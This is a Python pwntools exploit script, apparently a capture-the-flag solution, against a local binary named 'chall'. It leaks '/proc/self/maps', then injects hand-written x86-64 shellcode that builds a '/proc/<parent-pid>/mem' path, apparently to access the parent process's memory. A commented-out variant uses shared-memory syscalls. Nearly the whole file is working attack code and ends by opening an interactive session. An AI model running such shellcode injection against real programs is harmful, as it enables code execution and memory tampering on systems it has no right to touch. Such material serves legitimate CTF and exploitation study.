#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*x1_+406
        b*main
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
# input()
sla(b'Enter filename:', b'/proc/self/maps' + b'\0')

# shellcode = asm(f'''
#     lea r15, [rip]
#     mov rsp, rdi
#     add rsp, 0x500
#     add rdi, 0x500
#     mov dword ptr [rdi], 0x6d656d2f
#     mov r9, 10
# itoa_loop:
#     xor rdx, rdx
#     div r9
#     add dl, '0'
#     dec rdi
#     mov [rdi], dl
#     test rax, rax
#     jnz itoa_loop
    
                
#     sub rdi, 6                 
#     mov dword ptr [rdi], 0x6f72702f 
#     mov word ptr [rdi+4], 0x2f63   
#     mov r12, rdi               
                

#     xor edi, edi
#     mov esi, 0x1000
#     mov edx, 0x3b6                  
#     mov eax, 29
#     syscall

#     mov rdi, rax                  
#     mov rsi, 0x57360a048000         
#     xor rdx, rdx
#     mov eax, 30                    
#     syscall
                
#     mov r14, 0x57360a0480b0         
#     mov rsi, r12                    
#     mov rdi, r14
                
# copy_str:
#     mov al, [rsi]
#     mov [rdi], al
#     inc rsi
#     inc rdi
#     test al, al
#     jnz copy_str
    
                
#     mov rdi, r14                    
#     mov esi, 2                      
#     mov eax, 2                      
#     syscall
# ''')

shellcode = asm("""
    lea r14, [rip]
    mov rsp, rdi
    sub r14, 0x3e
                
    add rsp, 0x500
                
    mov eax, 110               
    syscall
                
    mov rdi, rsp
    sub rdi, 0x100
    mov r12, rdi
        
    mov dword ptr [rdi+20], 0x6d656d2f 
    mov byte ptr [rdi+24], 0
                
    mov rdi, r12
    add rdi, 20
    mov r9, 10
itoa_loop:
    xor rdx, rdx
    div r9
    add dl, '0'
    dec rdi
    mov [rdi], dl
    test rax, rax
    jnz itoa_loop
                

    sub rdi, 6
    mov dword ptr [rdi], 0x6f72702f 
    mov word ptr [rdi+4], 0x2f63
                
    mov rsi, rdi   
    add r14, 0x700             
    mov rdi, r14               
copy_str:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    test al, al
    jnz copy_str
""")

p.sendafter(b'Enter shellcode: ', shellcode)

p.interactive()
